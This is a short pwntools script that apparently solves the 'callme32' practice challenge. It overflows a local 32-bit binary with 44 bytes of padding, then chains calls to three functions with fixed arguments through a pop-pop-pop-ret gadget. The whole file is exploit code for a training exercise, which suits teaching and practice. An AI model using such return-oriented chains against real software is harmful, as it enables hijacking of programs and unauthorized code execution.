from pwn import *

context(terminal=['tmux','new-window'],os='linux',arch='i386')
# p = gdb.debug('./callme32')
p = process('./callme32')

padding = "A"*44
argpad = p32(0)
arg1 = p32(1)
arg2 = p32(2)
arg3 = p32(3)
callme1 = p32(0x080485c0)
callme2 = p32(0x08048620)
callme3 = p32(0x080485b0)
pop3ret = p32(0x080488a9)

payload = padding.encode() + callme1 + pop3ret + arg1 + arg2 + arg3 + callme2 + pop3ret + arg1 + arg2 + arg3 + callme3 + pop3ret + arg1 + arg2 + arg3
p.sendline(payload)
print(p.recvall().decode())
